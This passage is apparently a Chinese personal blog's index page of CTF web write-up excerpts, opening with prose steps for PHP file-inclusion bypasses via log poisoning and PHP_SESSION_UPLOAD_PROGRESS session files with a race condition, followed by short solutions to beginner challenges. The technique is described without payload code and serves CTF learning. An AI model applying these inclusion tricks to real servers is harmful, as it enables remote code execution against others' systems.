<p>用日志包含绕过，将执行的命令插入日志中nginx日志在(/var/log/httpd/access.log)目录下</p>
<p>利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</p>
<p>1.简单来说，上面这个选项开启以后，上传文件，我们能够POST请求查看上传进度</p>
<p>2.我们在session中写入我们要执行的代码</p>
<p>3.用户可以自己定义Session ID，比如在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag，我们能够命名’sess_’后面的名字</p>
<p>4.之后要执行就要包含这个session文件</p>
<p>5.默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，就会清除进度信息</p>
<p>6.于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是在执行系统命令前先执行完自己的代码，在文件上传中很常见</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/10/ctfshow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/10/ctfshow/" class="post-title-link" itemprop="url">ctfshow Web</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-10 21:25:16" itemprop="dateCreated datePublished" datetime="2021-03-10T21:25:16+08:00">2021-03-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-05 16:29:33" itemprop="dateModified" datetime="2021-11-05T16:29:33+08:00">2021-11-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>web签到题<br><img src="https://img-blog.csdnimg.cn/20210310191001410.png" alt="在这里插入图片描述"><br>本题考查信息搜集，F12查看源代码，<img src="https://img-blog.csdnimg.cn/20210310191045713.png" alt="在这里插入图片描述"><br>base64得到flag</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/03/10/ctfshow/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">攻防世界新手区题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-04 14:52:33" itemprop="dateCreated datePublished" datetime="2021-03-04T14:52:33+08:00">2021-03-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-05 16:29:50" itemprop="dateModified" datetime="2021-11-05T16:29:50+08:00">2021-11-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.view_source：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。<br> 本题打开网页查看源代码即得到flag</p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yun421.top/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Yun421">
      <meta itemprop="description" content="短暂的热爱过后剩下的是坚持">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yun421">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/" class="post-title-link" itemprop="url">攻防世界高手区题解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-04 14:41:51" itemprop="dateCreated datePublished" datetime="2021-03-04T14:41:51+08:00">2021-03-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-11-05 16:29:57" itemprop="dateModified" datetime="2021-11-05T16:29:57+08:00">2021-11-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>1.</p>
<p>   <img src="https://img-blog.csdnimg.cn/20201216202314127.png" alt="在这里插入图片描述"><br>   <img src="https://img-blog.csdnimg.cn/20201216202337147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>index.php还是跳回1.php，但是已经可以看到flag<br><img src="https://img-blog.csdnimg.cn/20201216202453186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bndhbmcwNDIx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2021/03/04/Web%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E5%8C%BA%E9%A2%98%E8%A7%A3/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Yun421"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Yun421</p>
  <div class="site-description" itemprop="description">短暂的热爱过后剩下的是坚持</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/yun0421" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yun0421" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2362702385@gmail.com" title="E-Mail → mailto:2362702385@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://anruoxi.mystrikingly.com/" title="https:&#x2F;&#x2F;anruoxi.mystrikingly.com&#x2F;" rel="noopener" target="_blank">anruoxi</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.yongsheng.site/" title="http:&#x2F;&#x2F;www.yongsheng.site&#x2F;" rel="noopener" target="_blank">Y0ng</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.njhlove.club/" title="http:&#x2F;&#x2F;www.njhlove.club&#x2F;" rel="noopener" target="_blank">菜牛</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://gonna-vae.mystrikingly.com/" title="http:&#x2F;&#x2F;gonna-vae.mystrikingly.com&#x2F;" rel="noopener" target="_blank">gonna</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.csdn.net/m0_53629868" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_53629868" rel="noopener" target="_blank">森森</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.csdn.net/qq_53063436?spm=1000.2115.3001.5343" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53063436?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank">cyxin11</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yun421</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

<!--这一段是不蒜子的访问量统计代码-->
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 &nbsp;   </span>
<span id="busuanzi_container_site_uv">访客数<span id="busuanzi_value_site_uv"></span>人次</span>
        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
